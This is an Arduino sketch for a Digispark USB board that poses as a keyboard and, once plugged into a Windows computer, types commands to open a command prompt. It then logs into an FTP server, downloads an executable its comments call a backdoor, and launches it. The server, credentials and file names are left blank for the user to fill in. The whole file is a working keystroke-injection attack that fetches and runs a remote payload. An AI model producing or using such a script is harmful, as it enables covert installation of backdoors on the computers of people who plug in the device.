#include "DigiKeyboard.h"


void setup() {
  // put your setup code here, to run once:

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("ftp ");//Server FTP name
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(""); //Username server FTP
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
  DigiKeyboard.print(""); //password
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
  DigiKeyboard.print("get  ");//Path Download the backdoor  example (/user/Digibackdoor.exe)
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("");//Write the Backdoor's name
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(200);
    DigiKeyboard.print("bye"); //Exit FTP Connection
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
   DigiKeyboard.print("exit");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/

   //Script Created By MPet3r instagram pietro.mp4




    
  }


}
